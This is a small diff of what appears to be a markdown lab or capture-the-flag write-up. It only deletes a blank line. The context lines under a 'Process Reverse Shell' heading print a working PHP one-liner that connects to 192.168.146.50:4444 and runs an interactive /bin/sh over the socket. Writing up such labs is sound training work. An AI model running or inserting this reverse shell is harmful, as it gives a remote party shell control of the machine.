@@ -198,7 +198,6 @@ index.html
 ##### Process Reverse Shell
 ```
 php -r '$sock=fsockopen("192.168.146.50",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
-
 ```
 
 ![Img](../FILES/Cute/img-20220725115522.png)
